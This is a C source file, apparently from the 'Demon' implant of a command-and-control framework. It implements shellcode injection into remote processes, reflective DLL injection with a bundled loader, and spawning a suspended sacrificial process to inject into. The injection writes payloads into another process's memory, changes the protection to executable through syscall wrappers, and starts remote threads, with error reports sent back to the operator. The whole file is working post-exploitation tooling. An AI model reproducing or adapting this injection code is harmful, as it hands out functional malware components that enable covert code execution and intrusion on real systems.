#include <Demon.h>
#include <ntstatus.h>

#include <Core/Win32.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Inject/Inject.h>
#include <Inject/InjectUtil.h>
#include <Common/Macros.h>
#include <Common/Defines.h>

/*!
 * Inject code into a remote process
 *
 * @param Method    thread execution method.
 * @param Handle    opened handle to the remote process.
 * @param Pid       if no handle has been provided than open the process using the Pid
 * @param x64       payload architecture (only x64/x86 supported).
 * @param Payload   payload buffer to inject
 * @param Size      payload buffer size to inject
 * @param Offset    execution entrypoint offset (can be used to specify the ReflectiveLoader function)
 * @param Argv      Argument buffer to pass to the injected code
 * @param Argc      Argument buffer size to pass to the injected code
 *
 * @return returns a INJECTION_ERROR_? status
 */
DWORD Inject(
    IN BYTE   Method,
    IN HANDLE Handle,
    IN DWORD  Pid,
    IN BOOL   x64,
    IN PVOID  Payload,
    IN SIZE_T Size,
    IN UINT64 Offset,
    IN PVOID  Argv,
    IN SIZE_T Argc
) {
    DWORD  Status  = INJECT_ERROR_FAILED;
    DWORD  Tid     = 0;
    HANDLE Process = NULL;
    HANDLE Thread  = NULL;
    PVOID  Memory  = NULL;
    PVOID  Param   = NULL;
    BOOL   IsWow64 = FALSE;

    /* check if required params have been specified */
    if ( ( ( ! Handle ) && ( ! Pid ) ) || ( ( ! Payload ) && ( ! Size ) ) ) {
        return INJECT_ERROR_INVALID_PARAM;
    }

    /* set the process handle */
    Process = Handle;

    /* if no handle has been specified then get process handle by Pid */
    if ( ! Process ) {
        if ( ( Process = ProcessOpen( Pid, PROCESS_ALL_ACCESS ) ) == NULL ) {
            PRINTF( "[INJECT] Failed to open process handle: %d\n", NtGetLastError() )
            Process = NULL;
            goto END;
        } else {
            PRINTF( "[INJECT] Opened process handle to %d: %x\n", Pid, Process )
        }
    } else {
        PRINTF( "[INJECT] Using specified process handle: %x\n", Process )
    }

    /* check the architecture matches */
    if ( x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
        PUTS( "The OS is x86!" )
        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
        goto END;
    }

    IsWow64 = ProcessIsWow( Process );

    if ( x64 && IsWow64 ) {
        PUTS( "The process target process is x86!" )
        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
        goto END;
    } else if ( ! x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
        PUTS( "The process target process is x64!" )
        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
        goto END;
    }

    /* allocate memory in the remote process */
    if ( ! ( Memory = MemoryAlloc( DX_MEM_DEFAULT, Process, Size, PAGE_READWRITE ) ) ) {
        PUTS( "[INJECT] Failed allocating memory in remote process" )
        goto END;
    } else {
        PRINTF( "[INJECT] Allocated memory in the remote process: %p\n", Memory )
    }

    /* write payload into remote process memory */
    if ( ! ( MemoryWrite( Process, Memory, Payload, Size ) ) ) {
        PUTS( "[INJECT] Failed to write payload into remote process" )
        goto END;
    } else {
        PRINTF( "[INJECT] Wrote payload into remote process: %d written\n", Size )
    }

    /* change allocated memory from RW to RX */
    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, Process, Memory, Size, PAGE_EXECUTE_READ ) ) ) {
        PUTS( "[INJECT] Failed to change memory protection" )
        goto END;
    } else {
        PUTS( "[INJECT] Changed memory protection from RW to RX" )
    }

    /* check if any args has been specified */
    if ( Argv && ( Argc > 0 ) )
    {
        /* allocate memory in the remote process */
        if ( ! ( Param = MemoryAlloc( DX_MEM_DEFAULT, Process, Argc, PAGE_READWRITE ) ) ) {
            PUTS( "[INJECT] Failed allocating argument memory in remote process" )
            goto END;
        } else {
            PRINTF( "[INJECT] Allocated argument memory in the remote process: %p\n", Param )
        }

        /* write payload into remote process memory */
        if ( ! ( MemoryWrite( Process, Param, Argv, Argc ) ) ) {
            PUTS( "[INJECT] Failed to write argument into remote process" )
            goto END;
        } else {
            PRINTF( "[INJECT] Wrote argument into remote process: %d written\n", Argc )
        }
    }

    /* create new thread in remote process */
    if ( ( Thread = ThreadCreate( Method, Process, x64, C_PTR( Memory + Offset ), Param, &Tid ) ) ) {
        Status = INJECT_ERROR_SUCCESS;
        PRINTF( "[INJECT] Successful injected code into remote process: [Tid: %d]\n", Tid );
    } else {
        PRINTF( "[INJECT] Failed to create a new thread: %d\n", NtGetLastError() )
    }

END:
    PUTS( "[INJECT] End of function. Cleanup start now" )

    /* if we failed to inject the lets free up allocated memory */
    if ( Status == INJECT_ERROR_FAILED )
    {
        /* free allocated payload */
        if ( Memory ) {
            MemoryFree( Process, Memory );
            Memory = NULL;
        }

        /* free allocated param */
        if ( Param ) {
            MemoryFree( Process, Param );
            Param = NULL;
        }
    }

    /* only close process handle if it wasn't passed to the function */
    if ( Process && ! Handle ) {
        SysNtClose( Process );
        Process = NULL;
    }

    /* close thread handle */
    if ( Thread ) {
        SysNtClose( Thread );
        Thread = NULL;
    }

    return Status;
}

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "DllInjectReflective( %x, %x, %d, %x )\n", hTargetProcess, DllBuffer, DllLength, ctx );

    NTSTATUS NtStatus            = STATUS_SUCCESS;
    LPVOID   MemParamsBuffer     = NULL;
    LPVOID   MemLibraryBuffer    = NULL;
    LPVOID   ReflectiveLdr       = NULL;
    LPVOID   FullDll             = NULL;
    LPVOID   MemRegion           = NULL;
    DWORD    MemRegionSize       = 0;
    DWORD    ReflectiveLdrOffset = 0;
    ULONG    FullDllSize         = 0;
    BOOL     HasRDll             = FALSE;
    DWORD    ReturnValue         = 0;
    SIZE_T   BytesWritten        = 0;
    BOOL     x64                 = Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ? FALSE : TRUE;

    if( ! DllBuffer || ! DllLength || ! hTargetProcess )
    {
        PUTS( "Params == NULL" )
        ReturnValue = -1;
        goto Cleanup;
    }

    if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
    {
        x64 = FALSE;
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
        }
    }
    else
    {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
        }
    }

    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
        PUTS( "The DLL has a Reflective Loader already defined" );
        HasRDll     = TRUE;
        FullDll     = DllBuffer;
        FullDllSize = DllLength;
    } else {
        PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
        HasRDll     = FALSE;
        FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
        FullDllSize = DllLdrSize + DllLength;
        MemCopy( FullDll, DllLdr, DllLdrSize );
        MemCopy( FullDll + DllLdrSize, DllBuffer, DllLength );
    }

    PRINTF( "Reflective Loader Offset => %x\n", ReflectiveLdrOffset );

    // Alloc and write remote params
    PRINTF( "Params: Size:[%d] Pointer:[%p]\n", ParamSize, Parameter )
    if ( ParamSize > 0 )
    {
        MemParamsBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
        if ( MemParamsBuffer )
        {
            PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
            NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                ReturnValue = NtStatus;
                goto Cleanup;
            }
            else
                PUTS( "Successful wrote params into remote library memory" );
        }
        else
        {
            PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            ReturnValue = -1;
            goto Cleanup;
        }
    }

    // Alloc and write remote library
    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, FullDllSize, PAGE_READWRITE );
    if ( MemLibraryBuffer )
    {
        PUTS( "[+] NtAllocateVirtualMemory: success" );
        if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
        {
            // TODO: check to get the .text section and size of it
            PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );

            ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
            MemRegion     = MemLibraryBuffer - ( ( ( UINT_PTR ) MemLibraryBuffer ) % 8192 );    // size of shellcode? change it to rx
            MemRegionSize = 16384;
            BytesWritten    = 0;

            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
            if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
            {
                ctx->Parameter = MemParamsBuffer;
                PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )

                if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess, x64, ReflectiveLdr, MemParamsBuffer, NULL ) )
                {
                    PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    ReturnValue = -1;
                    goto Cleanup;
                }

                ReturnValue = 0;
                goto Cleanup;
            }
            else
            {
                PUTS("[-] NtProtectVirtualMemory: failed")
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                ReturnValue = -1;
                goto Cleanup;
            }
        }
        else
        {
            PRINTF( "NtWriteVirtualMemory: Failed to write memory for library [%x]\n", NtStatus )
            PackageTransmitError( 0x1, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            ReturnValue = NtStatus;
            goto Cleanup;
        }
    }

    PRINTF( "Failed to allocate memory: %d\n", NtGetLastError() )
    ReturnValue = -1;

Cleanup:
    if ( ! HasRDll && FullDll )
    {
        MemSet( FullDll, 0, FullDllSize );
        NtHeapFree( FullDll );
        FullDll = NULL;
    }

    return ReturnValue;
}

DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );

    PROCESS_INFORMATION ProcessInfo = { 0 };
    PWCHAR              SpawnProc   = NULL;
    DWORD               Result      = 0;

    if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
        SpawnProc = Instance.Config.Process.Spawn86;
    else
        SpawnProc = Instance.Config.Process.Spawn64;

    /* Meh this is the default */
    Result = ERROR_INJECT_FAILED_TO_SPAWN_TARGET_PROCESS;

    if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, TRUE, NULL ) )
    {
        Result = DllInjectReflective( ProcessInfo.hProcess, DllLdr, DllLdrSize, DllBuffer, DllLength, Parameter, ParamSize, ctx );
        if ( Result != 0 )
        {
            PUTS( "Failed" )
            ProcessTerminate( ProcessInfo.hProcess, 0 );
            SysNtClose( ProcessInfo.hProcess );
            SysNtClose( ProcessInfo.hThread );
        }
    }

    return Result;
}
